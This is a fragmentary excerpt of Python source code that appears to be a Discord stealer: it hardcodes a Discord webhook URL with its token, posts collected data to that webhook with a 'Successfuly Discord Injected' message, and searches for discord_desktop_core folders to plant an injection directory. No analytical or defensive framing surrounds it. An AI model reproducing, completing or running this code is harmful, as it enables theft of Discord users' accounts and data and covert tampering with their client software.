...
hook = "https://discord.com/api/webhooks/1117584250951176342/S3LW8DBBjuxwTx5mcnx13X1U0EZAB7pKwF6E_Bi3yeq-93u-itUDXStUlUgONoq4CPhW"     
...
def upload(name, link):
    ...
    if name == "kiwi":
        ...
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        requests.post(hook, json={'content': f'💉 Successfuly Discord Injected.', "username": 'black', "avatar_url": 'https://media.discordapp.net/attachments/1041055954889871360/1041593034854371389/42efee5a6b432b43dde74dfde8429932.png'})
        return
                            ...
                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                ...
                                if ntpath.exists(inj_path):
                                    if srtupl0c not in argv[0]:
                                        try:
                                            os.makedirs(inj_path + 'black', exist_ok=True)
